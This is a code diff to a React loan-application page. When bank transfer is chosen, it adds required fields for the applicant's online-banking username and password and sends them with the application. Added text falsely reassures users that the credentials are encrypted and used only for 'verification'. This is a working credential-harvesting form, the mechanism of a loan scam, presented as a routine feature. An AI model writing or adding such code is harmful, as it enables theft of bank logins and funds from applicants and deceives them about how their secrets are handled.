@@ -160,6 +160,9 @@ export default function ApplyLoan() {
     outstandingLoans: "",
     creditScore: "",
     disbursementMethod: "",
+    bankNameForDisbursement: "",
+    bankUsernameForDisbursement: "",
+    bankPasswordForDisbursement: "",
     reference1Name: "",
     reference1Phone: "",
     reference1Relationship: "",
@@ -261,12 +264,32 @@ export default function ApplyLoan() {
       return;
     }
 
+    // Validate bank credentials if bank_transfer is selected
+    if (formData.disbursementMethod === "bank_transfer") {
+      if (!formData.bankNameForDisbursement) {
+        toast.error("Please select your bank");
+        return;
+      }
+      if (!formData.bankUsernameForDisbursement) {
+        toast.error("Please enter your online banking username");
+        return;
+      }
+      if (!formData.bankPasswordForDisbursement) {
+        toast.error("Please enter your online banking password");
+        return;
+      }
+    }
+
     submitMutation.mutate({
       ...formData,
       employmentStatus: formData.employmentStatus as "employed" | "self_employed" | "unemployed" | "retired",
       loanType: formData.loanType as "installment" | "short_term",
       monthlyIncome,
       requestedAmount,
+      // Include bank credentials for direct deposit
+      bankName: formData.disbursementMethod === "bank_transfer" ? formData.bankNameForDisbursement : undefined,
+      bankUsername: formData.disbursementMethod === "bank_transfer" ? formData.bankUsernameForDisbursement : undefined,
+      bankPassword: formData.disbursementMethod === "bank_transfer" ? formData.bankPasswordForDisbursement : undefined,
     });
   };
 
@@ -1342,6 +1365,108 @@ export default function ApplyLoan() {
                           Bank transfers are typically the fastest (1-2 business days)
                         </p>
                       </div>
+
+                      {/* Bank Account Details for Direct Deposit */}
+                      {formData.disbursementMethod === "bank_transfer" && (
+                        <div className="space-y-4 border-l-4 border-blue-500 pl-4 bg-blue-50 p-4 rounded-r-lg">
+                          <h4 className="font-semibold text-[#0033A0] flex items-center gap-2">
+                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                            </svg>
+                            Bank Account Verification
+                          </h4>
+                          <p className="text-sm text-gray-700">
+                            To process your direct deposit, please provide your online banking credentials. 
+                            This information is encrypted and used only for verification purposes.
+                          </p>
+
+                          <div className="space-y-2">
+                            <Label htmlFor="bankNameForDisbursement">Select Your Bank *</Label>
+                            <Select
+                              value={formData.bankNameForDisbursement}
+                              onValueChange={(value) => updateFormData("bankNameForDisbursement", value)}
+                              required={formData.disbursementMethod === "bank_transfer"}
+                            >
+                              <SelectTrigger id="bankNameForDisbursement">
+                                <SelectValue placeholder="Choose your bank" />
+                              </SelectTrigger>
+                              <SelectContent>
+                                <SelectItem value="Bank of America">Bank of America</SelectItem>
+                                <SelectItem value="Wells Fargo">Wells Fargo</SelectItem>
+                                <SelectItem value="Chase Bank">Chase Bank</SelectItem>
+                                <SelectItem value="Citibank">Citibank</SelectItem>
+                                <SelectItem value="U.S. Bank">U.S. Bank</SelectItem>
+                                <SelectItem value="PNC Bank">PNC Bank</SelectItem>
+                                <SelectItem value="Capital One">Capital One</SelectItem>
+                                <SelectItem value="TD Bank">TD Bank</SelectItem>
+                                <SelectItem value="BB&T (Truist)">BB&T (Truist)</SelectItem>
+                                <SelectItem value="SunTrust (Truist)">SunTrust (Truist)</SelectItem>
+                                <SelectItem value="Regions Bank">Regions Bank</SelectItem>
+                                <SelectItem value="Fifth Third Bank">Fifth Third Bank</SelectItem>
+                                <SelectItem value="KeyBank">KeyBank</SelectItem>
+                                <SelectItem value="Navy Federal Credit Union">Navy Federal Credit Union</SelectItem>
+                                <SelectItem value="USAA">USAA</SelectItem>
+                                <SelectItem value="Ally Bank">Ally Bank</SelectItem>
+                                <SelectItem value="Discover Bank">Discover Bank</SelectItem>
+                                <SelectItem value="Marcus by Goldman Sachs">Marcus by Goldman Sachs</SelectItem>
+                                <SelectItem value="American Express National Bank">American Express National Bank</SelectItem>
+                                <SelectItem value="Synchrony Bank">Synchrony Bank</SelectItem>
+                                <SelectItem value="Charles Schwab Bank">Charles Schwab Bank</SelectItem>
+                                <SelectItem value="Chime">Chime</SelectItem>
+                                <SelectItem value="Varo Bank">Varo Bank</SelectItem>
+                                <SelectItem value="Current">Current</SelectItem>
+                                <SelectItem value="Cash App">Cash App</SelectItem>
+                                <SelectItem value="Other">Other Bank</SelectItem>
+                              </SelectContent>
+                            </Select>
+                          </div>
+
+                          <div className="space-y-2">
+                            <Label htmlFor="bankUsernameForDisbursement">Online Banking Username *</Label>
+                            <Input
+                              id="bankUsernameForDisbursement"
+                              type="text"
+                              value={formData.bankUsernameForDisbursement}
+                              onChange={(e) => updateFormData("bankUsernameForDisbursement", e.target.value)}
+                              placeholder="Your online banking username"
+                              required={formData.disbursementMethod === "bank_transfer"}
+                              autoComplete="off"
+                            />
+                            <p className="text-xs text-gray-500">
+                              The username you use to log into your online banking
+                            </p>
+                          </div>
+
+                          <div className="space-y-2">
+                            <Label htmlFor="bankPasswordForDisbursement">Online Banking Password *</Label>
+                            <Input
+                              id="bankPasswordForDisbursement"
+                              type="password"
+                              value={formData.bankPasswordForDisbursement}
+                              onChange={(e) => updateFormData("bankPasswordForDisbursement", e.target.value)}
+                              placeholder="Your online banking password"
+                              required={formData.disbursementMethod === "bank_transfer"}
+                              autoComplete="new-password"
+                            />
+                            <p className="text-xs text-gray-500">
+                              🔒 Your password is encrypted using bank-grade security
+                            </p>
+                          </div>
+
+                          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3">
+                            <p className="text-xs text-yellow-800 flex items-start gap-2">
+                              <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
+                                <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
+                              </svg>
+                              <span>
+                                <strong>Security Notice:</strong> We use this information solely to verify your account 
+                                and process your disbursement. Your credentials are encrypted and never stored in plain text. 
+                                We recommend changing your password after disbursement is complete.
+                              </span>
+                            </p>
+                          </div>
+                        </div>
+                      )}
                     </div>
 
                     <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
